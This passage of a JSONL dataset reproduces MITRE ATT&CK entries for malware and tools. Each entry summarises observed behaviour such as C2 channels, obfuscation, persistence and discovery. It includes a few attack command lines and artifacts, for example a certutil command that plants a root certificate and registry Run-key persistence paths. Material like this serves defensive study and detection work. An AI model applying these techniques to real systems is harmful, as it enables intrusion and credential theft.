{"text": " [Comnie](https://attack.mitre.org/software/S0244) is a remote backdoor which has been used in attacks in East Asia. (Citation: Palo Alto Comnie)", "idx": "https://attack.mitre.org/software/S0244", "title": "Comnie", "entity": "Comnie", "entity_type": "software", "entity_context": ["Comnie uses RC4 and Base64 to obfuscate strings.", "Comnie collects the hostname of the victim machine.", "Comnie executes a batch script to store discovery information in %TEMP%\\info.dat and then uploads the temporarily file to the remote C2 server.", "Comnie uses Rundll32 to load a malicious DLL.", "Comnie uses blogs and third-party sites (GitHub, tumbler, and BlogSpot) to avoid DNS-based blocking of their communication to the command and control server.", "Comnie achieves persistence by adding a shortcut of itself to the startup path in the Registry.", "Comnie executes the <code>netstat -ano</code> command.", "Comnie attempts to detect several anti-virus products.", "Comnie runs the <code>net view</code> command", "Comnie uses Port Numbers 80, 8080, 8000, and 443 for communication to the C2 servers.", "Comnie uses <code>ipconfig /all</code> and <code>route PRINT</code> to identify network adapter and interface information.", "Comnie encrypts command and control communications with RC4.", "Comnie establishes persistence via a .lnk file in the victim’s startup path.", "Comnie uses the <code>tasklist</code> to view running processes on the victim’s machine.", "Comnie uses the <code>net user</code> command.", "Comnie uses HTTP for C2 communication.", "Comnie appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk.", "Comnie executes BAT scripts.", "Comnie executes VBS scripts.", "Comnie runs the command: <code>net start >> %TEMP%\\info.dat</code> on a victim."], "is_subtechnique": false}
{"text": " [BLINDINGCAN](https://attack.mitre.org/software/S0520) is a remote access Trojan that has been used by the North Korean government since at least early 2020 in cyber operations against defense, engineering, and government organizations in Western Europe and the US.(Citation: US-CERT BLINDINGCAN Aug 2020)(Citation: NHS UK BLINDINGCAN Aug 2020)", "idx": "https://attack.mitre.org/software/S0520", "title": "BLINDINGCAN", "entity": "BLINDINGCAN", "entity_type": "software", "entity_context": ["BLINDINGCAN has attempted to hide its payload by using legitimate file names such as \"iconcache.db\".", "BLINDINGCAN has encrypted its C2 traffic with RC4.", "BLINDINGCAN has obfuscated code using Base64 encoding.", "BLINDINGCAN has downloaded files to a victim machine.", "BLINDINGCAN has lured victims into executing malicious macros embedded within Microsoft Office documents.", "BLINDINGCAN has sent user and system information to a C2 server via HTTP POST requests.", "BLINDINGCAN has been signed with code-signing certificates such as CodeRipper.", "BLINDINGCAN has encoded its C2 traffic with Base64.", "BLINDINGCAN has collected the victim machine's local IP address information and MAC address.", "BLINDINGCAN has loaded and executed DLLs in memory during runtime on a victim machine.", "BLINDINGCAN can search, read, write, move, and execute files.", "BLINDINGCAN has used AES and XOR to decrypt its DLLs.", "BLINDINGCAN has executed commands via cmd.exe.", "BLINDINGCAN has been delivered by phishing emails containing malicious Microsoft Office documents.", " BLINDINGCAN has uploaded files from victim machines.", "BLINDINGCAN has collected from a victim machine the system name, processor information, OS version, and disk information, including type and free space available.", "BLINDINGCAN has deleted itself and associated artifacts from victim machines.", "BLINDINGCAN has used Rundll32 to load a malicious DLL.", "BLINDINGCAN has modified file and directory timestamps.", "BLINDINGCAN has been packed with the UPX packer.", "BLINDINGCAN has used HTTPS over port 443 for command and control."], "is_subtechnique": false}
{"text": " [CostaBricks](https://attack.mitre.org/software/S0614) is a loader that was used to deploy 32-bit backdoors in the [CostaRicto](https://attack.mitre.org/groups/G0132) campaign.(Citation: BlackBerry CostaRicto November 2020)", "idx": "https://attack.mitre.org/software/S0614", "title": "CostaBricks", "entity": "CostaBricks", "entity_type": "software", "entity_context": ["CostaBricks has the ability to use bytecode to decrypt embedded payloads.", "CostaBricks can implement a custom-built virtual machine mechanism to obfuscate its code.", "CostaBricks has added the entire unobfuscated code of the legitimate open source application Blink to its code.", "CostaBricks has been used to load SombRAT onto a compromised host."], "is_subtechnique": false}
{"text": " [ifconfig](https://attack.mitre.org/software/S0101) is a Unix-based utility used to gather information about and interact with the TCP/IP settings on a system. (Citation: Wikipedia Ifconfig)", "idx": "https://attack.mitre.org/software/S0101", "title": "ifconfig", "entity": "ifconfig", "entity_type": "software", "entity_context": ["ifconfig can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP."], "is_subtechnique": false}
{"text": " [certutil](https://attack.mitre.org/software/S0160) is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. (Citation: TechNet Certutil)", "idx": "https://attack.mitre.org/software/S0160", "title": "certutil", "entity": "certutil", "entity_type": "software", "entity_context": ["certutil can be used to download files from a given URL.", "certutil has been used to decode binaries hidden inside certificate files as Base64 information.", "certutil can be used to install browser root certificates as a precursor to performing Adversary-in-the-Middle between connections to banking websites. Example command: <code>certutil -addstore -f -user ROOT ProgramData\\cert512121.der</code>."], "is_subtechnique": false}
{"text": " [Skeleton Key](https://attack.mitre.org/software/S0007) is malware used to inject false credentials into domain controllers with the intent of creating a backdoor password. (Citation: Dell Skeleton) Functionality similar to [Skeleton Key](https://attack.mitre.org/software/S0007) is included as a module in [Mimikatz](https://attack.mitre.org/software/S0002).", "idx": "https://attack.mitre.org/software/S0007", "title": "Skeleton Key", "entity": "Skeleton Key", "entity_type": "software", "entity_context": ["Skeleton Key is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller."], "is_subtechnique": false}
{"text": " [SYSCON](https://attack.mitre.org/software/S0464) is a backdoor that has been in use since at least 2017 and has been associated with campaigns involving North Korean themes. [SYSCON](https://attack.mitre.org/software/S0464) has been delivered by the [CARROTBALL](https://attack.mitre.org/software/S0465) and [CARROTBAT](https://attack.mitre.org/software/S0462) droppers.(Citation: Unit 42 CARROTBAT November 2018)(Citation: Unit 42 CARROTBAT January 2020)", "idx": "https://attack.mitre.org/software/S0464", "title": "SYSCON", "entity": "SYSCON", "entity_type": "software", "entity_context": ["SYSCON has the ability to execute commands through cmd on a compromised host.", "SYSCON has been executed by luring victims to open malicious e-mail attachments.", "SYSCON has the ability to use Tasklist to list running processes.", "SYSCON has the ability to use FTP in C2 communications.", "SYSCON has the ability to use Systeminfo to identify system information."], "is_subtechnique": false}
{"text": " [Uroburos](https://attack.mitre.org/software/S0022) is a rootkit used by [Turla](https://attack.mitre.org/groups/G0010). (Citation: Kaspersky Turla)", "idx": "https://attack.mitre.org/software/S0022", "title": "Uroburos", "entity": "Uroburos", "entity_type": "software", "entity_context": ["Uroburos uses a custom packer.", "Uroburos is a rootkit used by Turla."], "is_subtechnique": false}
{"text": " [HTTPBrowser](https://attack.mitre.org/software/S0070) is malware that has been used by several threat groups. (Citation: ThreatStream Evasion Analysis) (Citation: Dell TG-3390) It is believed to be of Chinese origin. (Citation: ThreatConnect Anthem)", "idx": "https://attack.mitre.org/software/S0070", "title": "HTTPBrowser", "entity": "HTTPBrowser", "entity_type": "software", "entity_context": ["HTTPBrowser is capable of writing a file to the compromised system from the C2 server.", "HTTPBrowser deletes its original installer file once installation is complete.", "HTTPBrowser has used DLL side-loading.", "HTTPBrowser has used HTTP and HTTPS for command and control.", "HTTPBrowser has used DNS for command and control.", "HTTPBrowser has established persistence by setting the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> key value for <code>wdm</code> to the path of the executable. It has also used the Registry entry <code>HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn “%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe”</code> to establish persistence.", "HTTPBrowser is capable of listing files, folders, and drives on a victim.", "HTTPBrowser's code may be obfuscated through structured exception handling and return-oriented programming.", "HTTPBrowser abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.", "HTTPBrowser's installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.", "HTTPBrowser is capable of capturing keystrokes on victims.", "HTTPBrowser is capable of spawning a reverse shell on a victim.", "One HTTPBrowser variant connected to its C2 server over port 8080."], "is_subtechnique": false}
{"text": " [Cobian RAT](https://attack.mitre.org/software/S0338) is a backdoor, remote access tool that has been observed since 2016.(Citation: Zscaler Cobian Aug 2017)", "idx": "https://attack.mitre.org/software/S0338", "title": "Cobian RAT", "entity": "Cobian RAT", "entity_type": "software", "entity_context": ["Cobian RAT has a feature to perform keylogging on the victim’s machine.", "Cobian RAT creates an autostart Registry key to ensure persistence.", "Cobian RAT obfuscates communications with the C2 server using Base64 encoding.", "Cobian RAT can launch a remote command shell interface for executing commands.", "Cobian RAT uses DNS for C2.", "Cobian RAT has a feature to perform screen capture.", "Cobian RAT has a feature to access the webcam on the victim’s machine.", "Cobian RAT has a feature to perform voice recording on the victim’s machine."], "is_subtechnique": false}
{"text": " [CloudDuke](https://attack.mitre.org/software/S0054) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2015. (Citation: F-Secure The Dukes) (Citation: Securelist Minidionis July 2015)", "idx": "https://attack.mitre.org/software/S0054", "title": "CloudDuke", "entity": "CloudDuke", "entity_type": "software", "entity_context": ["One variant of CloudDuke uses HTTP and HTTPS for C2.", "One variant of CloudDuke uses a Microsoft OneDrive account to exchange commands and stolen data with its operators.", "CloudDuke downloads and executes additional malware from either a Web address or a Microsoft OneDrive account."], "is_subtechnique": false}
{"text": " [OSInfo](https://attack.mitre.org/software/S0165) is a custom tool used by [APT3](https://attack.mitre.org/groups/G0022) to do internal discovery on a victim's computer and network. (Citation: Symantec Buckeye)", "idx": "https://attack.mitre.org/software/S0165", "title": "OSInfo", "entity": "OSInfo", "entity_type": "software", "entity_context": ["OSInfo has enumerated the local administrators group.", "OSInfo specifically looks for Domain Admins and power users within the domain. ", "OSInfo discovers information about the infected machine.", "OSInfo enumerates local and domain users", "OSInfo enumerates the current network connections similar to <code> net use </code>.", "OSInfo queries the registry to look for information about Terminal Services.", "OSInfo performs a connection test to discover remote systems in the network", "OSInfo discovers the current domain information.", "OSInfo discovers shares on the network"], "is_subtechnique": false}
{"text": " [CoinTicker](https://attack.mitre.org/software/S0369) is a malicious application that poses as a cryptocurrency price ticker and installs components of the open source backdoors EvilOSX and EggShell.(Citation: CoinTicker 2019)", "idx": "https://attack.mitre.org/software/S0369", "title": "CoinTicker", "entity": "CoinTicker", "entity_type": "software", "entity_context": ["CoinTicker initially downloads a hidden encoded file.", "CoinTicker executes a Python script to download its second stage.", "CoinTicker downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.random string/random string.", "CoinTicker executes a bash script to establish a reverse shell.", "CoinTicker downloads the EggShell mach-o binary using curl, which does not set the quarantine flag.", "CoinTicker creates user launch agents named .espl.plist and com.apple.random string.plist to establish persistence.\t", "CoinTicker decodes the initially-downloaded hidden encoded file using OpenSSL."], "is_subtechnique": false}
{"text": " [GoldMax](https://attack.mitre.org/software/S0588) is a second-stage C2 backdoor written in Go that was used by [APT29](https://attack.mitre.org/groups/G0016) and discovered in early 2021 during the investigation into breaches related to the SolarWinds intrusion. [GoldMax](https://attack.mitre.org/software/S0588) uses multiple defense evasion techniques, including avoiding virtualization execution and masking malicious traffic.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021)", "idx": "https://attack.mitre.org/software/S0588", "title": "GoldMax", "entity": "GoldMax", "entity_type": "software", "entity_context": ["GoldMax has set an execution trigger date and time, stored as an ASCII Unix/Epoch time value.", "GoldMax has RSA-encrypted its communication with the C2 server.", "GoldMax can spawn a command shell, and execute native commands.", "GoldMax has used HTTPS and HTTP GET requests with custom HTTP cookies for C2.", "GoldMax can download and execute additional files.", "GoldMax has impersonated systems management software to avoid detection.", "GoldMax can check the current date-time value of the compromised system, comparing it to the hardcoded execution trigger and can send the current timestamp to the C2 server. ", "GoldMax will check if it is being run in a virtualized environment by comparing the collected MAC address to <code>c8:27:cc:c2:37:5a</code>.", "GoldMax has been packed for obfuscation.", "GoldMax can exfiltrate files over the existing C2 channel.", "GoldMax has used scheduled tasks to maintain persistence.", "GoldMax has used decoy traffic to surround its malicious network traffic to avoid detection.", "GoldMax retrieved a list of the system's network interface after execution.", "GoldMax has decoded and decrypted the configuration file when executed.", "GoldMax has written AES-encrypted and Base64-encoded configuration files to disk.", "GoldMax appeared as a scheduled task impersonating systems management software within the corresponding ProgramData subfolder."], "is_subtechnique": false}
{"text": " [SEASHARPEE](https://attack.mitre.org/software/S0185) is a Web shell that has been used by [OilRig](https://attack.mitre.org/groups/G0049). (Citation: FireEye APT34 Webinar Dec 2017)", "idx": "https://attack.mitre.org/software/S0185", "title": "SEASHARPEE", "entity": "SEASHARPEE", "entity_type": "software", "entity_context": ["SEASHARPEE can timestomp files on victims using a Web shell.", "SEASHARPEE can download remote files onto victims.", "SEASHARPEE can execute commands on victims.", "SEASHARPEE is a Web shell."], "is_subtechnique": false}
{"text": " [BS2005](https://attack.mitre.org/software/S0014) is malware that was used by [Ke3chang](https://attack.mitre.org/groups/G0004) in spearphishing campaigns since at least 2011. (Citation: Mandiant Operation Ke3chang November 2014)", "idx": "https://attack.mitre.org/software/S0014", "title": "BS2005", "entity": "BS2005", "entity_type": "software", "entity_context": ["BS2005 uses Base64 encoding for communication in the message body of an HTTP request."], "is_subtechnique": false}
{"text": " [BoomBox](https://attack.mitre.org/software/S0635) is a downloader responsible for executing next stage components that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)", "idx": "https://attack.mitre.org/software/S0635", "title": "BoomBox", "entity": "BoomBox", "entity_type": "software", "entity_context": ["BoomBox has used HTTP POST requests for C2.", "BoomBox can upload data to dedicated per-victim folders in Dropbox.", "BoomBox can execute an LDAP query to discover e-mail accounts for domain users.", "BoomBox has the ability to download next stage malware components to a compromised system.", "BoomBox has gained execution through user interaction with a malicious file.", "BoomBox can enumerate the username on a compromised host.", "BoomBox can encrypt data using AES prior to exfiltration.", "BoomBox can downloaded files from Dropbox using a hardcoded access token.", "BoomBox can use RunDLL32 for execution.", "BoomBox has the ability to mask malicious data strings as PDF files.", "BoomBox can search for specific files and directories on a machine.", "BoomBox has the ability to execute an LDAP query to enumerate the distinguished name, SAM account name, and display name for all domain users.", "BoomBox can check its current working directory and for the presence of a specific file and terminate if specific values are not found.", "BoomBox can establish persistence by writing the Registry value <code>MicroNativeCacheSvc</code> to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>.", "BoomBox can decrypt AES-encrypted files downloaded from C2.", "BoomBox can enumerate the hostname, domain, and IP of a compromised host."], "is_subtechnique": false}
{"text": " [RemoteUtilities](https://attack.mitre.org/software/S0592) is a legitimate remote administration tool that has been used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least 2021 for execution on target machines.(Citation: Trend Micro Muddy Water March 2021)", "idx": "https://attack.mitre.org/software/S0592", "title": "RemoteUtilities", "entity": "RemoteUtilities", "entity_type": "software", "entity_context": ["RemoteUtilities can upload and download files to and from a target machine.", "RemoteUtilities can enumerate files and directories on a target machine.", "RemoteUtilities can use Msiexec to install a service.", "RemoteUtilities can take screenshots on a compromised host."], "is_subtechnique": false}
{"text": " [NOKKI](https://attack.mitre.org/software/S0353) is a modular remote access tool. The earliest observed attack using [NOKKI](https://attack.mitre.org/software/S0353) was in January 2018. [NOKKI](https://attack.mitre.org/software/S0353) has significant code overlap with the [KONNI](https://attack.mitre.org/software/S0356) malware family. There is some evidence potentially linking [NOKKI](https://attack.mitre.org/software/S0353) to [APT37](https://attack.mitre.org/groups/G0067).(Citation: Unit 42 NOKKI Sept 2018)(Citation: Unit 42 Nokki Oct 2018)", "idx": "https://attack.mitre.org/software/S0353", "title": "NOKKI", "entity": "NOKKI", "entity_type": "software", "entity_context": ["NOKKI has used HTTP for C2 communications.", "NOKKI uses a unique, custom de-obfuscation technique.", "NOKKI uses Base64 encoding for strings.", "NOKKI has used FTP for C2 communications.", "NOKKI can gather information on drives and the operating system on the victim’s machine.", "NOKKI can collect data from the victim and stage it in <code>LOCALAPPDATA%\\MicroSoft Updatea\\uplog.tmp</code>.", "NOKKI can gather information on the victim IP address.", "NOKKI is written to %LOCALAPPDATA%\\MicroSoft Updatea\\svServiceUpdate.exe prior being executed in a new process in an apparent attempt to masquerade as a legitimate folder and file.", "NOKKI uses the Windows call SetWindowsHookEx and begins injecting it into every GUI process running on the victim's machine.", "NOKKI can collect the username from the victim’s machine.", "NOKKI can collect the current timestamp of the victim's machine.", "NOKKI has downloaded a remote module for execution.", "NOKKI has used rundll32 for execution.", "NOKKI can delete files to cover tracks.", "NOKKI has established persistence by writing the payload to the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>."], "is_subtechnique": false}
{"text": " [Valak](https://attack.mitre.org/software/S0476) is a multi-stage modular malware that can function as a standalone information stealer or downloader, first observed in 2019 targeting enterprises in the US and Germany.(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)", "idx": "https://attack.mitre.org/software/S0476", "title": "Valak", "entity": "Valak", "entity_type": "software", "entity_context": ["Valak has returned C2 data as encoded ASCII.", "Valak can download additional modules and malware capable of using separate C2 channels.", "Valak has the ability to decode and decrypt downloaded files.", "Valak has the ability to modify the Registry key <code>HKCU\\Software\\ApplicationContainer\\Appsw64</code> to store information regarding the C2 server and downloads.", "Valak can use <code>wmic process call create</code> in a scheduled task to launch plugins and for execution.", "Valak has the ability to identify the domain and the MAC and IP addresses of an infected machine.", "Valak has the ability to enumerate local admin accounts.", "Valak has the ability to enumerate domain admin accounts.", "Valak has used PowerShell to download additional modules.", "Valak has used HTTP in communications with C2.", "Valak has been delivered via malicious links in e-mail.", "Valak can use the clientgrabber module to steal e-mail credentials from the Registry.", "Valak can execute tasks via OLE.", "Valak has used packed DLL payloads.", "Valak has the ability save and execute files as alternate data streams (ADS).", "Valak has been executed via Microsoft Word documents containing malicious macros.", "Valak can download a module to search for and build a report of harvested credential data.", "Valak can use the Registry for code updates and to collect credentials.", "Valak can communicate over multiple C2 hosts.", "Valak has been delivered via spearphishing e-mails with password protected ZIP files.", "Valak has downloaded a variety of modules and payloads to the compromised host, including IcedID and NetSupport Manager RAT-based malware.", "Valak can use a .NET compiled module named exchgrabber to enumerate credentials from the Credential Manager.", "Valak can determine if a compromised host has security products installed.", "Valak can collect sensitive mailing information from Exchange servers, including credentials and the domain certificate of an enterprise.", "Valak can determine the Windows version and computer name on a compromised host.", "Valak has used <code>regsvr32.exe</code> to launch malicious DLLs.", "Valak has the ability to base64 encode and XOR encrypt strings.", "Valak has the ability to exfiltrate data over the C2 channel.", "Valak has used scheduled tasks to execute additional payloads and to gain persistence on a compromised host.", "Valak has the ability to enumerate running processes on a compromised host.", "Valak has the ability to take screenshots on a compromised host.\t ", "Valak can execute JavaScript containing configuration data for establishing persistence.", "Valak can gather information regarding the user."], "is_subtechnique": false}
{"text": " [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) is a fully-featured beaconing implant integrated with command modules used by [Lazarus Group](https://attack.mitre.org/groups/G0032). It was first reported in May 2020.(Citation: CISA MAR-10288834-2.v1 TAINTEDSCRIBE MAY 2020)", "idx": "https://attack.mitre.org/software/S0586", "title": "TAINTEDSCRIBE", "entity": "TAINTEDSCRIBE", "entity_type": "software", "entity_context": ["TAINTEDSCRIBE uses a Linear Feedback Shift Register (LFSR) algorithm for network encryption.", "TAINTEDSCRIBE has used <code>FileReadZipSend</code> to compress a file and send to C2.", "TAINTEDSCRIBE can randomly pick one of five hard-coded IP addresses for C2 communication; if one of the IP fails, it will wait 60 seconds and then try another IP address.", "TAINTEDSCRIBE can delete files from a compromised host.", "TAINTEDSCRIBE can change the timestamp of specified filenames.", "The TAINTEDSCRIBE main executable has disguised itself as Microsoft’s Narrator.", "The TAINTEDSCRIBE command and execution module can perform target system enumeration.", "TAINTEDSCRIBE can use <code>DirectoryList</code> to enumerate files in a specified directory.", "TAINTEDSCRIBE can use <code>DriveList</code> to retrieve drive information.", "TAINTEDSCRIBE can execute <code>FileRecvWriteRand</code> to append random bytes to the end of a file received from C2.", "TAINTEDSCRIBE can download additional modules from its C2 server.", "TAINTEDSCRIBE has used FakeTLS for session authentication.", "TAINTEDSCRIBE can enable Windows CLI access and execute files.", "TAINTEDSCRIBE can execute <code>ProcessList</code> for process discovery.", "TAINTEDSCRIBE can copy itself into the current user’s Startup folder as “Narrator.exe” for persistence.", "TAINTEDSCRIBE can execute <code>GetLocalTime</code> for time discovery."], "is_subtechnique": false}
{"text": " [Brave Prince](https://attack.mitre.org/software/S0252) is a Korean-language implant that was first observed in the wild in December 2017. It contains similar code and behavior to [Gold Dragon](https://attack.mitre.org/software/S0249), and was seen along with [Gold Dragon](https://attack.mitre.org/software/S0249) and [RunningRAT](https://attack.mitre.org/software/S0253) in operations surrounding the 2018 Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon)", "idx": "https://attack.mitre.org/software/S0252", "title": "Brave Prince", "entity": "Brave Prince", "entity_type": "software", "entity_context": ["Brave Prince lists the running processes.", "Some Brave Prince variants have used South  Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command.", "Brave Prince gathers file and directory information from the victim’s machine.", "Brave Prince collects hard drive content and system configuration information.", "Brave Prince terminates antimalware processes.", "Brave Prince gathers network configuration information as well as the ARP cache.", "Brave Prince gathers information about the Registry."], "is_subtechnique": false}
{"text": " [Naid](https://attack.mitre.org/software/S0205) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Naid June 2012)", "idx": "https://attack.mitre.org/software/S0205", "title": "Naid", "entity": "Naid", "entity_type": "software", "entity_context": ["Naid collects a unique identifier (UID) from a compromised host.", "Naid creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.", "Naid connects to external C2 infrastructure over port 443.", "Naid creates a new service to establish.", "Naid collects the domain name from a compromised host."], "is_subtechnique": false}
{"text": " [SYNful Knock](https://attack.mitre.org/software/S0519) is a stealthy modification of the operating system of network devices that can be used to maintain persistence within a victim's network and provide new capabilities to the adversary.(Citation: FireEye - Synful Knock)(Citation: Cisco Synful Knock Evolution)", "idx": "https://attack.mitre.org/software/S0519", "title": "SYNful Knock", "entity": "SYNful Knock", "entity_type": "software", "entity_context": ["SYNful Knock is malware that is inserted into a network device by patching the operating system image.", "SYNful Knock can be sent instructions via special packets to change its functionality. Code for new functionality can be included in these messages.", "SYNful Knock has the capability to add its own custom backdoor password when it modifies the operating system of the affected network device."], "is_subtechnique": false}
{"text": " [Seth-Locker](https://attack.mitre.org/software/S0639) is a ransomware with some remote control capabilities that has been in use since at least 2021. (Citation: Trend Micro Ransomware February 2021)", "idx": "https://attack.mitre.org/software/S0639", "title": "Seth-Locker", "entity": "Seth-Locker", "entity_type": "software", "entity_context": ["Seth-Locker can execute commands via the command line shell.", "Seth-Locker can encrypt files on a targeted system, appending them with the suffix .seth.", "Seth-Locker has the ability to download and execute files on a compromised host."], "is_subtechnique": false}
{"text": " [SNUGRIDE](https://attack.mitre.org/software/S0159) is a backdoor that has been used by [menuPass](https://attack.mitre.org/groups/G0045) as first stage malware. (Citation: FireEye APT10 April 2017)", "idx": "https://attack.mitre.org/software/S0159", "title": "SNUGRIDE", "entity": "SNUGRIDE", "entity_type": "software", "entity_context": ["SNUGRIDE communicates with its C2 server over HTTP.", "SNUGRIDE is capable of executing commands and spawning a reverse shell.", "SNUGRIDE establishes persistence through a Registry Run key.", "SNUGRIDE encrypts C2 traffic using AES with a static key."], "is_subtechnique": false}
{"text": " [SpeakUp](https://attack.mitre.org/software/S0374) is a Trojan backdoor that targets both Linux and OSX devices. It was first observed in January 2019. (Citation: CheckPoint SpeakUp Feb 2019)", "idx": "https://attack.mitre.org/software/S0374", "title": "SpeakUp", "entity": "SpeakUp", "entity_type": "software", "entity_context": ["SpeakUp deletes files to remove evidence on the machine. ", "SpeakUp downloads and executes additional files from a remote server. ", "SpeakUp attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager. ", "SpeakUp encodes C&C communication using Base64. ", "SpeakUp uses the <code>arp -a</code> command. ", "SpeakUp checks for availability of specific ports on servers.", "SpeakUp uses Perl scripts.", "SpeakUp can perform brute forcing using a pre-defined list of usernames and passwords in an attempt to log in to administrative panels. ", "SpeakUp uses the <code>cat /proc/cpuinfo | grep -c “cpu family” 2>&1</code> command to gather system information. ", "SpeakUp uses Python scripts.", "SpeakUp uses the <code>ifconfig -a</code> command. ", "SpeakUp encodes its second-stage payload with Base64. ", "SpeakUp uses cron tasks to ensure persistence. ", "SpeakUp uses the <code>whoami</code> command. ", "SpeakUp uses POST and GET requests over HTTP to communicate with its main C&C server. "], "is_subtechnique": false}
{"text": " [SharpStage](https://attack.mitre.org/software/S0546) is a .NET malware with backdoor capabilities.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020)", "idx": "https://attack.mitre.org/software/S0546", "title": "SharpStage", "entity": "SharpStage", "entity_type": "software", "entity_context": ["SharpStage has the ability to create persistence for the malware using the Registry autorun key and startup folder. ", "SharpStage has decompressed data received from the C2 server.", "SharpStage  has been used to target Arabic-speaking users and used code that checks if the compromised machine has the Arabic language installed.", "SharpStage has the ability to capture the victim's screen.", "SharpStage can use WMI for execution.", "SharpStage has checked the system settings to see if Arabic is the configured language.", "SharpStage can execute arbitrary commands with the command line.", "SharpStage can execute arbitrary commands with PowerShell.", "SharpStage has the ability to download and execute additional payloads via a DropBox API.", "SharpStage has used a legitimate web service for evading detection. ", "SharpStage has a persistence component to write a scheduled task for the payload. "], "is_subtechnique": false}
{"text": " [Winnti for Linux](https://attack.mitre.org/software/S0430) is a trojan, seen since at least 2015, designed specifically for targeting Linux systems. Reporting indicates the winnti malware family is shared across a number of actors including [Winnti Group](https://attack.mitre.org/groups/G0044). The Windows variant is tracked separately under [Winnti for Windows](https://attack.mitre.org/software/S0141).(Citation: Chronicle Winnti for Linux May 2019)", "idx": "https://attack.mitre.org/software/S0430", "title": "Winnti for Linux", "entity": "Winnti for Linux", "entity_type": "software", "entity_context": ["Winnti for Linux has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control (C2) mechanism.", "Winnti for Linux has used a modified copy of the open-source userland rootkit Azazel, named libxselinux.so, to hide the malware's operations and network activity.", "Winnti for Linux has decoded XOR encoded strings holding its configuration upon execution.", "Winnti for Linux can encode its configuration file with single-byte XOR encoding.", "Winnti for Linux has the ability to deploy modules directly from command and control (C2) servers, possibly for remote command execution, file exfiltration, and socks5 proxying on the infected host. ", "Winnti for Linux has used a custom TCP protocol with four-byte XOR for command and control (C2).", "Winnti for Linux has used HTTP in outbound communications.", "Winnti for Linux has used ICMP, custom TCP, and UDP in outbound communications."], "is_subtechnique": false}
{"text": " [Sibot](https://attack.mitre.org/software/S0589) is dual-purpose malware written in VBScript designed to achieve persistence on a compromised system as well as download and execute additional payloads. Microsoft discovered three [Sibot](https://attack.mitre.org/software/S0589) variants in early 2021 during its investigation of [APT29](https://attack.mitre.org/groups/G0016) and the SolarWinds cyber intrusion campaign.(Citation: MSTIC NOBELIUM Mar 2021)", "idx": "https://attack.mitre.org/software/S0589", "title": "Sibot", "entity": "Sibot", "entity_type": "software", "entity_context": ["Sibot communicated with its C2 server via HTTP GET requests.", "Sibot has installed a second-stage script in the <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot</code> registry key.", "Sibot has been executed via MSHTA application.", "Sibot has obfuscated scripts used in execution.", "Sibot has downloaded a DLL to the <code>C:\\windows\\system32\\drivers\\</code> folder and renamed it with a <code>.sys</code> extension.", "Sibot can decrypt data received from a C2 and save to a file.", "Sibot has executed downloaded DLLs with <code>rundll32.exe</code>.", "Sibot has been executed via a scheduled task.", "Sibot will delete an associated registry key if a certain server response is received.", "Sibot checked if the compromised system is configured to use proxies.", "Sibot has retrieved a GUID associated with a present LAN connection on a compromised machine.", "Sibot will delete itself if a certain server response is received.", "Sibot has queried the registry for proxy server information.", "Sibot can download and execute a payload onto a compromised system.", "Sibot executes commands using VBScript.\t", "Sibot has used a legitimate compromised website to download DLLs to the victim's machine.", "Sibot has used WMI to discover network connections and configurations. Sibot has also used the Win32_Process class to execute a malicious DLL."], "is_subtechnique": false}
{"text": " [Zebrocy](https://attack.mitre.org/software/S0251) is a Trojan that has been used by [APT28](https://attack.mitre.org/groups/G0007) since at least November 2015. The malware comes in several programming language variants, including C++, Delphi, AutoIt, C#, VB.NET, and Golang. (Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: CISA Zebrocy Oct 2020)", "idx": "https://attack.mitre.org/software/S0251", "title": "Zebrocy", "entity": "Zebrocy", "entity_type": "software", "entity_context": ["Zebrocy has the capability to upload dumper tools that extract credentials from web browsers and store them in database files.", "Zebrocy has a command to create a scheduled task for persistence.", "Zebrocy has exfiltrated data to the designated C2 server using HTTP POST requests. ", "Zebrocy uses the <code>tasklist</code> and <code>wmic process get Capture, ExecutablePath</code> commands to gather the processes running on the system.", "Zebrocy uses <code>netstat -aon</code> to gather network connection information.", "Zebrocy  has used a method similar to RC4 as well as AES for encryption and hexadecimal for encoding data before exfiltration.  ", "Zebrocy uses HTTP for C2.", "Zebrocy uses cmd.exe to execute commands on the system. ", "Zebrocy uses SMTP and POP3 for C2.", "Zebrocy creates an entry in a Registry Run key for the malware to execute on startup.", "Zebrocy has used URL/Percent Encoding on data exfiltrated 